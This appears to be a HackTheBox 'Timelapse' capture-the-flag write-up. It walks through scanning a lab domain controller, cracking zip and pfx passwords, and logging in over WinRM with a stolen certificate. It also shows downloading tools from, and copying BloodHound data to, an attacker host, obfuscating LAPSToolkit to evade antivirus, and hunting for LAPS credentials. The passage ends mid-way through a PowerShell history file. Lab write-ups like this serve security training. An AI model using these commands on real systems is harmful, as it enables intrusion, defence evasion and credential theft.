# Timelapse

## Introduction

Welcome to my another writeup! In this HackTheBox [Timelapse](https://app.hackthebox.com/machines/Timelapse) machine, you'll learn: Enumerating SMB shares, cracking password protected zip file and `pfx` certificate, privilege escalation via clear-text credentials in PowerShell history, dumping LAPS password, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation : legacyy to svc_deploy](#privilege-escalation)**
4. **[Privilege Escalation : svc_deploy to Administrator](#svc_deploy-to-administrator)**
5. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Timelapse.png)

## Service Enumeration

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:28:37(HKT)]
└> export RHOSTS=10.10.11.152            
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:28:39(HKT)]
└> export LHOST=`ifconfig tun0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:28:55(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -Pn -oN scanning/rustscan.txt
[...]
Open 10.10.11.152:53
Open 10.10.11.152:88
Open 10.10.11.152:135
Open 10.10.11.152:139
Open 10.10.11.152:389
Open 10.10.11.152:445
Open 10.10.11.152:464
Open 10.10.11.152:593
Open 10.10.11.152:636
Open 10.10.11.152:3268
Open 10.10.11.152:3269
Open 10.10.11.152:5986
Open 10.10.11.152:9389
Open 10.10.11.152:49667
Open 10.10.11.152:49674
Open 10.10.11.152:49673
Open 10.10.11.152:49696
[...]
PORT      STATE SERVICE           REASON  VERSION
53/tcp    open  domain            syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack Microsoft Windows Kerberos (server time: 2023-08-09 15:30:58Z)
135/tcp   open  msrpc             syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack
464/tcp   open  kpasswd5?         syn-ack
593/tcp   open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack
3268/tcp  open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack
5986/tcp  open  ssl/http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
| SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
| -----BEGIN CERTIFICATE-----
[...]
|_-----END CERTIFICATE-----
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2023-08-09T15:32:28+00:00; +8h00m00s from scanner time.
9389/tcp  open  mc-nmf            syn-ack .NET Message Framing
49667/tcp open  msrpc             syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             syn-ack Microsoft Windows RPC
49696/tcp open  msrpc             syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:29:07(HKT)]
└> sudo nmap -v -sU -Pn $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
PORT    STATE SERVICE
88/udp  open  kerberos-sec
123/udp open  ntp
```

According to `rustscan` and `nmap` result, the target machine has 18 port are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|53/TCP            | Simple DNS Plus               |
|88/TCP/UDP        | Kerberos                      |
|123/UDP           | NTP                           |
|135/TCP, 593/TCP, 49667/TCP, 49673/TCP, 49674/TCP, 49696/TCP| RPC|
|139/TCP           | NetBIOS                       |
|389/TCP, 3268/TCP | LDAP                          |
|445/TCP           | SMB                           |
|464/TCP           | Kerberos Password Change      |
|636/TCP, 3269/TCP | LDAPS                         |
|5986/TCP          | WinRM with SSL                |
|9389/TCP          | .NET Message Framing          |

**Also, we can add new hosts from the `nmap` script scan (`-sC`) result to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:34:07(HKT)]
└> echo "$RHOSTS timelapse.htb dc01.timelapse.htb" | sudo tee -a /etc/hosts
10.10.11.152 timelapse.htb dc01.timelapse.htb
```

Moreover, the Kerberos service suggested that **this machine is an Active Directory's Domain Controller**.

### DNS on TCP port 53

**Enumerate DNS records:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:43:57(HKT)]
└> dig ANY timelapse.htb

; <<>> DiG 9.18.16-1-Debian <<>> ANY timelapse.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 33166
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;timelapse.htb.			IN	ANY

;; AUTHORITY SECTION:
.			86392	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2023080900 1800 900 604800 86400

;; Query time: 3 msec
;; SERVER: 10.69.96.2#53(10.69.96.2) (TCP)
;; WHEN: Wed Aug 09 15:43:58 HKT 2023
;; MSG SIZE  rcvd: 117
```

No records.

### LDAP/S on TCP port 389, 636, 3268, 3269

**Try to use `ldapdomaindump` as guest user to dump all the information about the domain:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:45:21(HKT)]
└> mkdir ldapdomaindump
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:45:30(HKT)]
└> ldapdomaindump $RHOSTS -o ldapdomaindump/ 
[*] Connecting as anonymous user, dumping will probably fail. Consider specifying a username/password to login with
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:46:03(HKT)]
└> ls -lah ldapdomaindump 
total 76K
drwxr-xr-x 2 siunam nam 4.0K Aug  9 15:45 .
drwxr-xr-x 5 siunam nam 4.0K Aug  9 15:45 ..
-rw-r--r-- 1 siunam nam  584 Aug  9 15:45 domain_computers_by_os.html
-rw-r--r-- 1 siunam nam  158 Aug  9 15:45 domain_computers.grep
-rw-r--r-- 1 siunam nam  917 Aug  9 15:45 domain_computers.html
-rw-r--r-- 1 siunam nam    2 Aug  9 15:45 domain_computers.json
-rw-r--r-- 1 siunam nam   72 Aug  9 15:45 domain_groups.grep
-rw-r--r-- 1 siunam nam  820 Aug  9 15:45 domain_groups.html
-rw-r--r-- 1 siunam nam    2 Aug  9 15:45 domain_groups.json
-rw-r--r-- 1 siunam nam  165 Aug  9 15:45 domain_policy.grep
-rw-r--r-- 1 siunam nam  971 Aug  9 15:45 domain_policy.html
-rw-r--r-- 1 siunam nam    2 Aug  9 15:45 domain_policy.json
-rw-r--r-- 1 siunam nam   71 Aug  9 15:45 domain_trusts.grep
-rw-r--r-- 1 siunam nam  828 Aug  9 15:45 domain_trusts.html
-rw-r--r-- 1 siunam nam    2 Aug  9 15:45 domain_trusts.json
-rw-r--r-- 1 siunam nam  584 Aug  9 15:45 domain_users_by_group.html
-rw-r--r-- 1 siunam nam  132 Aug  9 15:45 domain_users.grep
-rw-r--r-- 1 siunam nam  905 Aug  9 15:45 domain_users.html
-rw-r--r-- 1 siunam nam    2 Aug  9 15:45 domain_users.json
```

No result, which means we need valid domain user credentials.

### SMB on TCP port 445

**Enumerate SMB shares as guest user:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:31:17(HKT)]
└> smbmap -H $RHOSTS -u 'Guest' -p ''
[...]
[+] IP: 10.10.11.152:445	Name: 10.10.11.152                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Shares                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
```

- Non-default share: `Shares`

**Listing directories on `Shares`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:36:50(HKT)]
└> smbmap -H $RHOSTS -u 'Guest' -p '' -R 'Shares'
[+] IP: 10.10.11.152:445	Name: timelapse.htb                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Shares                                            	READ ONLY	
	.\Shares\*
	dr--r--r--                0 Mon Oct 25 23:55:14 2021	.
	dr--r--r--                0 Mon Oct 25 23:55:14 2021	..
	dr--r--r--                0 Tue Oct 26 03:40:06 2021	Dev
	dr--r--r--                0 Mon Oct 25 23:55:14 2021	HelpDesk
	.\Shares\Dev\*
	dr--r--r--                0 Tue Oct 26 03:40:06 2021	.
	dr--r--r--                0 Tue Oct 26 03:40:06 2021	..
	fr--r--r--             2611 Tue Oct 26 05:05:30 2021	winrm_backup.zip
	.\Shares\HelpDesk\*
	dr--r--r--                0 Mon Oct 25 23:55:14 2021	.
	dr--r--r--                0 Mon Oct 25 23:55:14 2021	..
	fr--r--r--          1118208 Mon Oct 25 23:55:14 2021	LAPS.x64.msi
	fr--r--r--           104422 Mon Oct 25 23:55:14 2021	LAPS_Datasheet.docx
	fr--r--r--           641378 Mon Oct 25 23:55:14 2021	LAPS_OperationsGuide.docx
	fr--r--r--            72683 Mon Oct 25 23:55:14 2021	LAPS_TechnicalSpecification.docx
```

Hmm... What's that `winrm_backup.zip` in `Dev` directory?

**Let's download all of the files:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|15:38:22(HKT)]
└> mkdir smb_findings; cd smb_findings
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|15:42:05(HKT)]
└> smbmap -H $RHOSTS -u 'Guest' -p '' -R 'Shares' -A '.*'
[+] IP: 10.10.11.152:445	Name: timelapse.htb                                     
[+] Starting search for files matching '.*' on share Shares.
[+] Match found! Downloading: Shares\Dev\winrm_backup.zip
[+] Match found! Downloading: Shares\HelpDesk\LAPS.x64.msi
[+] Match found! Downloading: Shares\HelpDesk\LAPS_Datasheet.docx
[+] Match found! Downloading: Shares\HelpDesk\LAPS_OperationsGuide.docx
[+] Match found! Downloading: Shares\HelpDesk\LAPS_TechnicalSpecification.docx
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|15:42:34(HKT)]
└> file *     
10.10.11.152-Shares_Dev_winrm_backup.zip:                      Zip archive data, at least v2.0 to extract, compression method=deflate
10.10.11.152-Shares_HelpDesk_LAPS_Datasheet.docx:              Microsoft Word 2007+
10.10.11.152-Shares_HelpDesk_LAPS_OperationsGuide.docx:        Microsoft Word 2007+
10.10.11.152-Shares_HelpDesk_LAPS_TechnicalSpecification.docx: Microsoft Word 2007+
10.10.11.152-Shares_HelpDesk_LAPS.x64.msi:                     Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, MSI Installer, Code page: 1252, Title: Installation Database, Subject: Local Administrator Password Solution, Author: Microsoft Corporation, Keywords: Installer, Comments: Version: 6.2.0.0, Template: x64;1033, Revision Number: {7E1C3ED1-C10E-4A84-AE14-E165EF9C0C8F}, Create Time/Date: Wed May  5 15:54:22 2021, Last Saved Time/Date: Wed May  5 15:54:22 2021, Number of Pages: 500, Number of Words: 2, Name of Creating Application: Windows Installer XML Toolset (3.14.0.4118), Security: 2
```

In here, we downloaded a few files, those Word documents and the `zip` file looks interesting.

**Let's unzip `winrm_backup.zip` first:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|15:46:55(HKT)]
└> unzip 10.10.11.152-Shares_Dev_winrm_backup.zip 
Archive:  10.10.11.152-Shares_Dev_winrm_backup.zip
[10.10.11.152-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password: 
   skipping: legacyy_dev_auth.pfx    incorrect password
```

It requires password... 

**We can crack it via `zip2john` and `john`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|15:47:35(HKT)]
└> zip2john 10.10.11.152-Shares_Dev_winrm_backup.zip > winrm_backup.zip.hash
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|15:47:45(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.zip.hash 
[...]
{Redacted}    (10.10.11.152-Shares_Dev_winrm_backup.zip/legacyy_dev_auth.pfx)     
[...]
```

Cracked!

**Unzip it again with the cracked password:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|15:48:13(HKT)]
└> unzip 10.10.11.152-Shares_Dev_winrm_backup.zip
Archive:  10.10.11.152-Shares_Dev_winrm_backup.zip
[10.10.11.152-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|15:48:18(HKT)]
└> file legacyy_dev_auth.pfx 
legacyy_dev_auth.pfx: data
```

After unzipped, it has a `pfx` file.

A [Personal Information Exchange (.pfx) Files](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files "Personal Information Exchange (.pfx) Files"), is password protected file certificate commonly used for **code signing your application**. (From [https://www.advancedinstaller.com/what-is-pfx-certificate.html](https://www.advancedinstaller.com/what-is-pfx-certificate.html))

**That being said, we can crack its password via `pfx2john` and `john`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|15:58:36(HKT)]
└> pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.pfx.hash
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|15:58:40(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx.hash 
[...]
{Redacted}       (legacyy_dev_auth.pfx)
[...]
```

Cracked again!

**`LAPS_Datasheet.docx`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Pasted%20image%2020230809155017.png)

After reading `LAPS_Datasheet.docx`, `LAPS_OperationsGuide.docx`, and `LAPS_TechnicalSpecification.docx`, it's clear that the Active Directory environment is using LAPS (Local Administrator Password Solution). Those files in `HelpDesk` directory can be found in [https://www.microsoft.com/en-US/download/details.aspx?id=46899](https://www.microsoft.com/en-US/download/details.aspx?id=46899).

> **LAPS** allows you to **manage the local Administrator password** (which is **randomised**, unique, and **changed regularly**) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES. (From [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps))

According to [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps), we can dump LAPS passwords. However, we need to gain initial foothold first.

## Initial Foothold

Now, in the cracked `legacyy_dev_auth.pfx`'s filename, it looks like the `legacyy` is a domain username, and `dev` suggests this domain user is in `dev` domain group? Also, the `auth` makes me thinking this certificate is used to do authentication.

Hmm... Since WinRM is up, **maybe domain user `legacyy` is using the certificate to WinRM into the Domain Controller?**

After fumbling around, I found [this blog](https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790), which talks about **WinRM certificate-based authentication**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Pasted%20image%2020230809164104.png)

That being said, we can **try to WinRM into domain user `legacyy`.**

**However, we need to extract the SSL certificate and private key from the `pfx` file:** (Commands are from [https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file))
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|16:31:06(HKT)]
└> openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|16:31:59(HKT)]
└> openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|16:32:52(HKT)]
└> openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth_decrypted.key
Enter pass phrase for legacyy_dev_auth.key:
writing RSA key
```

**After that, we can try to use `evil-winrm`, `legacyy_dev_auth.pfx`'s SSL certificate and private key to authenticate as domain user `legacyy`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|16:45:21(HKT)]
└> evil-winrm -S -i $RHOSTS -u legacyy -c legacyy_dev_auth.crt -k legacyy_dev_auth_decrypted.key 
[...]
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami; ipconfig /all
timelapse\legacyy

Windows IP Configuration

   Host Name . . . . . . . . . . . . : dc01
   Primary Dns Suffix  . . . . . . . : timelapse.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : timelapse.htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-7B-4A
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::4113:1f9:543d:6321%13(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.10.11.152(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 33574998
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2C-65-68-F0-00-50-56-B9-7B-4A
   DNS Servers . . . . . . . . . . . : 127.0.0.1
[...]
```

I'm user `legacyy`!

**user.txt:**
```shell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
{Redacted}
```

## Privilege Escalation

### legacyy to svc_deploy

After gaining initial foothold, we need to escalate our privilege. To do so, we need to enumerate the system.

**Domain users:**
```shell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user /domain
[...]
-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
```

- Non-default domain user: `babywyrm`, `legacyy`, `payl0ad`, `sinfulz`, `svc_deploy`, `thecybergeek`, `TRX`

**We can also use Bloodhound and Sharphound to analyze the domain's attack paths.**

- **Transfer `SharpHound` collector:**

```
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse/smb_findings)-[2023.08.09|17:02:44(HKT)]
└> python3 -m http.server -d /opt/SharpHound 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> IWR -Uri http://10.10.14.6/SharpHound.exe -OutFile SharpHound.exe
*Evil-WinRM* PS C:\Users\legacyy\Desktop> ./SharpHound.exe --CollectionMethods All
2023-08-09T10:03:32.8558319-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
[...]
2023-08-09T10:04:17.7620823-07:00|INFORMATION|SharpHound Enumeration Completed at 10:04 AM on 8/9/2023! Happy Graphing!
*Evil-WinRM* PS C:\Users\legacyy\Desktop> ls
[...]
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/9/2023  10:04 AM          12287 20230809100416_BloodHound.zip
-a----         8/9/2023  10:03 AM         908288 SharpHound.exe
-ar---         8/9/2023   8:29 AM             34 user.txt
```

> Note: You can also transfer files via `evil-winrm`'s `download` and `upload` command.

- **Upload the collected zip file via SMB:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|17:23:21(HKT)]
└> impacket-smbserver attacker_share . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[...]
```

```shell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> net use \\10.10.14.6\attacker_share
The command completed successfully.
*Evil-WinRM* PS C:\Users\legacyy\Desktop> copy 20230809100416_BloodHound.zip \\10.10.14.6\attacker_share\
```

- **Unzip it:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|17:25:10(HKT)]
└> unzip 20230809100416_BloodHound.zip 
Archive:  20230809100416_BloodHound.zip
  inflating: 20230809100416_computers.json  
  inflating: 20230809100416_users.json  
  inflating: 20230809100416_groups.json  
  inflating: 20230809100416_containers.json  
  inflating: 20230809100416_domains.json  
  inflating: 20230809100416_gpos.json  
  inflating: 20230809100416_ous.json  
```

- **Use Bloodhound to view the collected data:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|17:26:27(HKT)]
└> sudo neo4j start
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|17:26:42(HKT)]
└> bloodhound 

```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Pasted%20image%2020230809172708.png)

- **Import the collected data:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Pasted%20image%2020230809172823.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Pasted%20image%2020230809172828.png)

Now, we can find the attack path that can escalate our privilege to Domain Admins.

**Find all Domain Admins:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Pasted%20image%2020230809172910.png)

- Found 4 Domain Admins: `TRX`, `payl0ad`, `thecybergeek`, `Administrator`.

**Mark them as high value:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Pasted%20image%2020230809173109.png)

**Shortest path to Domain Admins:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Pasted%20image%2020230809173223.png)

**Mark `legacyy` as owned:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Pasted%20image%2020230809173244.png)

After poking around at the Bloodhound, I found nothing interesting.

Let's take a step back.

In the downloaded Word documents in `Shares` SMB share, we knew that the Active Directory environment has implemented LAPS.

**According to [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps#check-if-activated), we can confirm LAPS is really there or not:**
```shell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd
    AdmPwdEnabled    REG_DWORD    0x1
```

Yep, the Domain Controller has LAPS.

Armed with above information, we can use [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) to enumerate LAPS.

- **Transfer `LAPSToolkit.ps1`:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|17:38:42(HKT)]
└> file /opt/LAPSToolkit.ps1          
/opt/LAPSToolkit.ps1: ASCII text
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|17:38:51(HKT)]
└> python3 -m http.server -d /opt 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> iwr -Uri http://10.10.14.6/LAPSToolkit.ps1 -OutFile LAPSToolkit.ps1
```

- **Import PowerShell functions from `LAPSToolkit.ps1`:**

```shell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> Import-Module .\LAPSToolkit.ps1
At C:\Users\legacyy\Desktop\LAPSToolkit.ps1:1 char:1
+ #requires -version 2
+ ~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At C:\Users\legacyy\Desktop\LAPSToolkit.ps1:1 char:1
+ #requires -version 2
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Oh... Wait, the PowerShell script is blocked by the anti-virus (AV) software...

In order to bypass the AV, we can do some PowerShell obfuscation.

Upon researching, I found **[Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth) PowerShell script obfuscator**.

**Let's obfuscate `LAPSToolkit.ps1`!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|17:51:37(HKT)]
└> pwsh                             
PowerShell 7.3.6

┌──(siunam㉿Mercury)-[/home/siunam/ctf/htb/Machines/Timelapse]
└─PS> iwr -useb https://darkbyte.net/invoke-stealth.php -outfile Invoke-Stealth.ps1
┌──(siunam㉿Mercury)-[/home/siunam/ctf/htb/Machines/Timelapse]
└─PS> copy /opt/LAPSToolkit.ps1 .
┌──(siunam㉿Mercury)-[/home/siunam/ctf/htb/Machines/Timelapse]
└─PS> ./Invoke-Stealth.ps1 ./LAPSToolkit.ps1 -technique All    
[...]
[+] Loading Chameleon and doing some obfuscation.. [OK]
[!] Avoid mixing BetterXencrypt with another techniques.. [OK]
[+] Loading PyFuscation and doing more obfuscation.. [OK]
[+] Encoding with base64 and reverse it to avoid detections.. [OK]
[+] Loading PSObfuscation and randomizing script.. [OK]
[+] Done!
```

**Then transfer the obfuscated `LAPSToolkit.ps1`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|17:51:49(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> iwr -Uri http://10.10.14.6/LAPSToolkit.ps1 -OutFile LAPSToolkit.ps1
*Evil-WinRM* PS C:\Users\legacyy\Desktop> Import-Module .\LAPSToolkit.ps1
```

**Now we can use its functions!**

**Get groups that can read passwords:**
```shell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> Find-LAPSDelegatedGroups

OrgUnit                                    Delegated Groups
-------                                    ----------------
OU=Domain Controllers,DC=timelapse,DC=htb  TIMELAPSE\LAPS_Readers
OU=Servers,DC=timelapse,DC=htb             TIMELAPSE\LAPS_Readers
OU=Database,OU=Servers,DC=timelapse,DC=htb TIMELAPSE\LAPS_Readers
OU=Web,OU=Servers,DC=timelapse,DC=htb      TIMELAPSE\LAPS_Readers
OU=Dev,OU=Servers,DC=timelapse,DC=htb      TIMELAPSE\LAPS_Readers
```

**Checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights":**
```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> Find-AdmPwdExtendedRights

ComputerName       Identity               Reason
------------       --------               ------
dc01.timelapse.htb TIMELAPSE\LAPS_Readers Delegated
```

Hmm... It seems like the **domain group `LAPS_Readers` can read LAPS passwords**.

**We can check which member belongs to `LAPS_Readers` group:**
```shell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> net groups LAPS_Readers
Group name     LAPS_Readers
Comment

Members

-------------------------------------------------------------------------------
svc_deploy
```

So, `svc_deploy` is a member of group `LAPS_Readers`.

That being said, **if we can authenticated as `svc_deploy` domain user, we can dump LAPS passwords!**

**Domain user `svc_deploy` details:**
```shell
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user svc_deploy /domain
User name                    svc_deploy
Full Name                    svc_deploy
[...]
Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
```

And this domain user is a member of `Remote Management User` local group! Which means **this domain user can WinRM into the Domain Controller**!

**After enumerate the Domain Controller deeper, I found an interesting PowerShell history file:**
```shell
*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
